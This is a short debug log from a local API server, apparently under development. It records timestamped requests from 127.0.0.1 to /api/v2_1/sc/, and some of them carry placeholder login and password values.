25.08.28 16:26:46 140229862831680: url_prefix
25.08.28 16:26:46 140229862831680: /api/v2_1/sc/
25.08.28 16:26:46 140229862831680: if
25.08.28 16:26:46 140229862831680: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:26:46 140229862831680: url_prefix
25.08.28 16:26:46 140229862831680: /api/v2_1/sc/
25.08.28 16:26:46 140229862831680: if
25.08.28 16:27:08 140229862831680: Запрос:
	Address: 127.0.0.1
	Query: {"login":"user1","pass":"pass1"}
	Authorization: empty
25.08.28 16:27:08 140229862831680: url_prefix
25.08.28 16:27:08 140229862831680: /api/v2_1/sc/
25.08.28 16:27:08 140229862831680: if
25.08.28 16:27:22 140229862831680: Запрос:
	Address: 127.0.0.1
	Query: {"login":"user2","pass":"pass2"}
	Authorization: empty
25.08.28 16:27:22 140229862831680: url_prefix
25.08.28 16:27:22 140229862831680: /api/v2_1/sc/
25.08.28 16:27:22 140229862831680: if
